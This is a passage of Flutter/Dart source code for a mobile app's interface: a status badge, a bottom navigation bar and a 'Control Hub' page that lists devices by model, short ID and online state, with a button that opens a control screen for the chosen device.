              color: on ? _Theme.success : _Theme.error,
              shape: BoxShape.circle,
              boxShadow: on
                  ? [
                      BoxShadow(
                        color: _Theme.success.withOpacity(0.5),
                        blurRadius: 4,
                      ),
                    ]
                  : [],
            ),
          ),
          const SizedBox(width: 4),
          Text(
            on ? 'ON' : 'OFF',
            style: TextStyle(
              color: on ? _Theme.success : _Theme.error,
              fontSize: 9,
              fontWeight: FontWeight.w800,
              letterSpacing: 0.5,
            ),
          ),
        ],
      ),
    );
  }

  // ─── BOTTOM NAVIGATION ──────────────────────────────────────────────────
  Widget _buildBottomNav() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 16),
      margin: const EdgeInsets.fromLTRB(20, 0, 20, 16),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(32),
        border: Border.all(color: _Theme.border, width: 1.2),
        boxShadow: [
          BoxShadow(
            color: _Theme.shadowDeep,
            blurRadius: 20,
            offset: const Offset(0, 6),
          ),
        ],
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _buildNavItem(
            icon: Icons.dashboard_rounded,
            label: 'Device',
            index: 0,
          ),
          Container(
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: const LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [_Theme.primary, _Theme.primaryLight],
              ),
              boxShadow: [
                BoxShadow(
                  color: _Theme.primary.withOpacity(0.45),
                  blurRadius: 18,
                  spreadRadius: 1,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                customBorder: const CircleBorder(),
                onTap: () => _onBottomTap(1),
                child: Container(
                  width: 56,
                  height: 56,
                  alignment: Alignment.center,
                  child: const Icon(
                    Icons.control_point_rounded,
                    color: Colors.white,
                    size: 30,
                  ),
                ),
              ),
            ),
          ),
          _buildNavItem(
            icon: Icons.shield_rounded,
            label: 'Permission',
            index: 2,
          ),
        ],
      ),
    );
  }

  Widget _buildNavItem({
    required IconData icon,
    required String label,
    required int index,
  }) {
    final isSelected = _selectedBottomIndex == index;
    return GestureDetector(
      onTap: () => _onBottomTap(index),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 280),
        curve: Curves.easeOutCubic,
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: isSelected
              ? _Theme.primary.withOpacity(0.08)
              : Colors.transparent,
          borderRadius: BorderRadius.circular(16),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              icon,
              color: isSelected ? _Theme.primary : _Theme.textDim,
              size: 22,
            ),
            const SizedBox(height: 3),
            Text(
              label,
              style: TextStyle(
                color: isSelected ? _Theme.primary : _Theme.textDim,
                fontSize: 9.5,
                fontWeight:
                    isSelected ? FontWeight.w800 : FontWeight.w600,
                letterSpacing: 0.2,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── CONTROL HUB PAGE ─────────────────────────────────────────────────────
class _ControlHubPage extends StatelessWidget {
  final List<dynamic> devices;
  final String role;

  const _ControlHubPage({required this.devices, required this.role});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _Theme.bg,
      body: SafeArea(
        child: Column(
          children: [
            // Custom modern app bar
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
              child: Row(
                children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: Colors.white,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(
                            color: _Theme.shadowDeep,
                            blurRadius: 8,
                            offset: const Offset(0, 2),
                          ),
                        ],
                      ),
                      child: const Icon(
                        Icons.arrow_back_ios_new_rounded,
                        color: _Theme.text,
                        size: 16,
                      ),
                    ),
                  ),
                  const SizedBox(width: 14),
                  const Text(
                    'Control Hub',
                    style: TextStyle(
                      color: _Theme.text,
                      fontSize: 19,
                      fontWeight: FontWeight.w800,
                      letterSpacing: -0.3,
                    ),
                  ),
                  const Spacer(),
                  Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 10, vertical: 5),
                    decoration: BoxDecoration(
                      color: _Theme.primary.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Text(
                      '${devices.length} DEVICES',
                      style: const TextStyle(
                        color: _Theme.primary,
                        fontSize: 10,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 0.8,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Expanded(
              child: devices.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Container(
                            padding: const EdgeInsets.all(24),
                            decoration: BoxDecoration(
                              color: Colors.white,
                              shape: BoxShape.circle,
                              boxShadow: [
                                BoxShadow(
                                  color: _Theme.shadowDeep,
                                  blurRadius: 16,
                                  offset: const Offset(0, 4),
                                ),
                              ],
                            ),
                            child: const Icon(
                              Icons.devices_other_rounded,
                              color: _Theme.textDim,
                              size: 40,
                            ),
                          ),
                          const SizedBox(height: 16),
                          const Text(
                            'No devices available',
                            style: TextStyle(
                              color: _Theme.textSub,
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ],
                      ),
                    )
                  : ListView.builder(
                      padding: const EdgeInsets.all(16),
                      itemCount: devices.length,
                      itemBuilder: (ctx, i) {
                        final d = devices[i];
                        final on = d['online'] == true;
                        final idStr = d['id']?.toString() ?? '-';
                        final shortId = idStr.length > 8
                            ? idStr.substring(0, 8)
                            : idStr;
                        return TweenAnimationBuilder<double>(
                          tween: Tween(begin: 0.0, end: 1.0),
                          duration:
                              Duration(milliseconds: 320 + (i * 60)),
                          curve: Curves.easeOutCubic,
                          builder: (ctx, val, child) {
                            return Transform.translate(
                              offset: Offset(30 * (1 - val), 0),
                              child: Opacity(opacity: val, child: child),
                            );
                          },
                          child: Container(
                            margin: const EdgeInsets.only(bottom: 12),
                            padding: const EdgeInsets.all(16),
                            decoration: BoxDecoration(
                              color: Colors.white,
                              borderRadius: BorderRadius.circular(20),
                              border: Border.all(
                                color: on
                                    ? _Theme.primary.withOpacity(0.15)
                                    : _Theme.border,
                                width: 1.2,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: _Theme.shadowDeep,
                                  blurRadius: 12,
                                  offset: const Offset(0, 4),
                                ),
                              ],
                            ),
                            child: Row(
                              children: [
                                Container(
                                  padding: const EdgeInsets.all(12),
                                  decoration: BoxDecoration(
                                    gradient: LinearGradient(
                                      begin: Alignment.topLeft,
                                      end: Alignment.bottomRight,
                                      colors: on
                                          ? [
                                              _Theme.primary
                                                  .withOpacity(0.12),
                                              _Theme.accent
                                                  .withOpacity(0.12),
                                            ]
                                          : [
                                              _Theme.textDim
                                                  .withOpacity(0.08),
                                              _Theme.textDim
                                                  .withOpacity(0.04),
                                            ],
                                    ),
                                    borderRadius:
                                        BorderRadius.circular(14),
                                  ),
                                  child: Icon(
                                    Icons.phone_android_rounded,
                                    color: on
                                        ? _Theme.primary
                                        : _Theme.textDim,
                                    size: 24,
                                  ),
                                ),
                                const SizedBox(width: 14),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    children: [
                                      Text(
                                        d['model'] ?? 'Unknown',
                                        style: const TextStyle(
                                          color: _Theme.text,
                                          fontSize: 15,
                                          fontWeight: FontWeight.w800,
                                          letterSpacing: -0.2,
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis,
                                      ),
                                      const SizedBox(height: 3),
                                      Text(
                                        shortId,
                                        style: const TextStyle(
                                          color: _Theme.textDim,
                                          fontSize: 11,
                                          fontFamily: 'Astral',
                                          letterSpacing: 0.8,
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                                const SizedBox(width: 8),
                                GestureDetector(
                                  onTap: on
                                      ? () {
                                          Navigator.push(
                                            context,
                                            MaterialPageRoute(
                                              builder: (_) =>
                                                  ControlCenterPage(
                                                targetDevice: d,
                                                role: role,
                                              ),
                                            ),
                                          );
                                        }
                                      : null,
                                  child: Container(
                                    padding: const EdgeInsets.symmetric(
                                        horizontal: 14, vertical: 10),
                                    decoration: BoxDecoration(
                                      gradient: LinearGradient(
                                        colors: on
                                            ? [
                                                _Theme.primary,
                                                _Theme.primaryLight,
                                              ]
                                            : [
                                                _Theme.textDim
                                                    .withOpacity(0.4),
                                                _Theme.textDim
                                                    .withOpacity(0.3),
                                              ],
                                      ),
                                      borderRadius:
                                          BorderRadius.circular(12),
                                      boxShadow: on
                                          ? [
                                              BoxShadow(
                                                color: _Theme.primary
                                                    .withOpacity(0.3),
                                                blurRadius: 8,
                                                offset:
                                                    const Offset(0, 3),
                                              ),
                                            ]
                                          : [],
                                    ),
                                    child: Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Icon(
                                          on
                                              ? Icons
                                                  .play_arrow_rounded
                                              : Icons
                                                  .power_off_rounded,
                                          color: Colors.white,
                                          size: 16,
                                        ),
                                        const SizedBox(width: 4),
                                        Text(
                                          on ? 'Control' : 'Offline',
                                          style: const TextStyle(
                                            color: Colors.white,
                                            fontSize: 11,
                                            fontWeight: FontWeight.w800,
                                            letterSpacing: 0.3,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }
}